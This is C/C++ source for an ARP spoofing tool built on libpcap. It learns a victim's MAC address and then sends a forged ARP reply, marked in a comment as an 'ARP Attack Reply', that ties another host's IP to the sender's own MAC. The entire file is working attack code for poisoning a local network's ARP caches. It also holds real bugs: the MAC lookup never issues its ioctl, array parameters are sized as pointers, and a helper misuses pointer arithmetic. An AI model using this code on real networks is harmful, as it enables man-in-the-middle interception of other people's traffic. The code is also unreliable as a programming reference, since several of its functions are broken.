#include <stdlib.h>
#include <arpa/inet.h>
#include <cstdint>
#include <string.h>
#include <pcap.h>
#include <iostream>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include <sstream>
#include <sys/types.h>
#include <ifaddrs.h>
#include <src/libnet/libnet-macros.h>
#include <src/libnet/libnet-types.h>
#include <src/libnet/libnet-headers.h>
#include "src/define.h"
#include "structure.cpp"
#define PCAP_OPENFLAG_PROMISCUOUS   1

using namespace std;

int main(int argc, char **argv)
{
    pcap_t *fp;
    u_char packet[42];
    libnet_ethernet_hdr eth_header = {};
    libnet_arp_hdr arp_header = {};
    arp_format arp_info = {};

    char *interface = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    char *target_ip = argv[2];
    char *sender_ip = argv[3];
    char *my_ip = getIpAddress(interface);

    uint8_t mac[6]={0};
    uint8_t broad_mac[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
    uint16_t arp_type = 0x0608;
    getMacAddress(interface,mac);


    interface = pcap_lookupdev(errbuf);
    if ( (fp = pcap_open_live(interface, BUFSIZ, PCAP_OPENFLAG_PROMISCUOUS, 1000, errbuf)) == NULL)
    {
        fprintf(stderr,"Unable to open the Adapter.%s is not supported by Libpcap %s", interface, errbuf);
        return 0;
    }

    setEther(&eth_header, broad_mac, mac);
    setArpType(&arp_header, 0x0100);
    setArpInfo(&arp_info, broad_mac, target_ip, mac, my_ip);

    //Copy Header to memory
    memcpy(packet, &eth_header, sizeof(eth_header));
    memcpy(packet+sizeof(eth_header), &arp_header, sizeof(arp_header));
    memcpy(packet+sizeof(eth_header)+sizeof(arp_header), &arp_info, sizeof(arp_info));
    //copyPacket(&packet, &eth_header, &arp_header, &arp_info);


    //printHex(sizeof(packet),packet);

    //Send Packet
    if (pcap_sendpacket(fp, packet, sizeof(packet)) != 0)
    {
        fprintf(stderr,"\nError sending the packet: \n", pcap_geterr(fp));
        return 0;
    }

    //Listen ARP Reply
     while (true) {
        struct pcap_pkthdr* header;
        const libnet_ethernet_hdr* ethdr;
        const u_char* read_packet;
        const libnet_arp_hdr * recv_arp_info;
        const arp_format * recv_arp_data;
        int res = pcap_next_ex(fp, &header, &read_packet);

        //Get Ethernet Header From Packet
        ethdr = (struct libnet_ethernet_hdr*)(read_packet);

        //arp check
        if (ethdr->ether_type == arp_type)
        {
            //Get IP Header From Packet
            recv_arp_info = (struct libnet_arp_hdr*)(read_packet+sizeof(struct libnet_ethernet_hdr));
            recv_arp_data = (struct arp_format*)(read_packet+sizeof(struct libnet_ethernet_hdr)+sizeof(struct libnet_arp_hdr));

            uint8_t send_mac[6] = {0};
            memcpy(send_mac, recv_arp_data->send_mac, sizeof(recv_arp_data->send_mac));

            //Set Send Packet
            setEther(&eth_header, send_mac, mac);
            setArpType(&arp_header, 0x0200);
            setArpInfo(&arp_info, send_mac, target_ip, mac, sender_ip);

            //Copy Header to memory
            memcpy(packet, &eth_header, sizeof(eth_header));
            memcpy(packet+sizeof(eth_header), &arp_header, sizeof(arp_header));
            memcpy(packet+sizeof(eth_header)+sizeof(arp_header), &arp_info, sizeof(arp_info));

            //Send ARP Attack Reply Packet
            printHex(sizeof(packet),packet);
            if (pcap_sendpacket(fp, packet, sizeof(packet)) != 0)
            {
                fprintf(stderr,"\nError sending the packet: \n", pcap_geterr(fp));
                return 0;
            }
            break;
        }
     }

    pcap_close(fp);

    return 0;
}

/**
 * @brief getIpAddress
 * @details Get My Network Interface's IP
 * @param interface
 * @return
 */
char* getIpAddress(char *interface)
{
    struct ifaddrs *ifap, *ifa;
    struct sockaddr_in *sa;

    getifaddrs (&ifap);
    for (ifa = ifap; ifa; ifa = ifa->ifa_next) {

        if (strcmp(ifa->ifa_name, interface) == 0)
        {
           if (ifa->ifa_addr->sa_family==AF_INET) {
                sa = (struct sockaddr_in *) ifa->ifa_addr;
                inet_ntoa(sa->sin_addr);
                //printf("Interface: %s\tAddress: %s\n", ifa->ifa_name, addr);
                freeifaddrs(ifap);
                return inet_ntoa(sa->sin_addr);
           }
        }
    }

    freeifaddrs(ifap);

}


/**
 * @brief getMacAddress
 * @detail Get My Network Interface's MAC Address
 * @param interface
 * @param mac
 */
void getMacAddress(char *interface, uint8_t *mac)
{
        int fd;

       struct ifreq ifr;
       fd = socket(AF_INET, SOCK_DGRAM, 0);

       ifr.ifr_addr.sa_family = AF_INET;
       strncpy((char *)ifr.ifr_name , (const char *)interface , IFNAMSIZ-1);


       close(fd);

       memcpy(mac, (uint8_t*)ifr.ifr_hwaddr.sa_data, 6);
}
/**
 * @brief printHex
 * @detail Print Packet Data with Hex Format
 * @param length
 * @param packet
 */
void printHex(int length, const u_char* packet )
{

    int i=0;
    while(i<length) {
        printf("%02X ", packet[i]);

        ++i;
        if (i%8==0)
        {
            printf(" ");
        }
        if (i%16 == 0)
        {
            printf("\n");
        }
    }

    printf("\n");
}
/**
 * @brief setArpInfo
 * @detail Set ARP  Sender and Target Info
 * @param ptr
 * @param target_mac
 * @param target_ip
 * @param sender_mac
 * @param sender_ip
 */
void setArpInfo(struct arp_format *ptr,  uint8_t target_mac[6], char *target_ip, uint8_t sender_mac[6], char *sender_ip)
{

    memcpy(ptr->send_mac, sender_mac, sizeof(sender_mac) );
    ptr->send_ip = inet_addr(sender_ip);
    memcpy(ptr->target_mac, target_mac, sizeof(target_mac) );
    ptr->target_ip = inet_addr(target_ip);
}

/**
 * @brief setArpType
 * @detail Set ARP Header Info
 * @param ptr
 * @param opcode
 */
void setArpType(struct libnet_arp_hdr *ptr, u_int16_t opcode)
{
    //Set ARP Header
    ptr->ar_hrd = 0x0100;
    ptr->ar_hln = 0x06;
    ptr->ar_pro = 0x0008;
    ptr->ar_pln = 0x04;
    ptr->ar_op = opcode;
}
/**
 * @brief setEther
 * @detail Set Ethernet Header
 * @param ptr
 * @param target_mac
 * @param sender_mac
 */
void setEther(struct libnet_ethernet_hdr *ptr, uint8_t target_mac[6], uint8_t sender_mac[6])
{

    //Set Target MAC
    memcpy(ptr->ether_dhost, target_mac, 6);
    memcpy(ptr->ether_shost, sender_mac, 6);
    ptr->ether_type = 0x0608;

}

/**
 * @brief copyPacket
 * @param packet
 * @param eth_header
 * @param arp_header
 * @param arp_info
 */
void copyPacket(u_char *packet, libnet_ethernet_hdr *eth_header, libnet_arp_hdr *arp_header, arp_format *arp_info)
{
    //Copy Header to memory
    memcpy(&packet, &eth_header, sizeof(eth_header));
    memcpy(&packet+sizeof(eth_header), &arp_header, sizeof(arp_header));
    memcpy(&packet+sizeof(eth_header)+sizeof(arp_header), &arp_info, sizeof(arp_info));

}
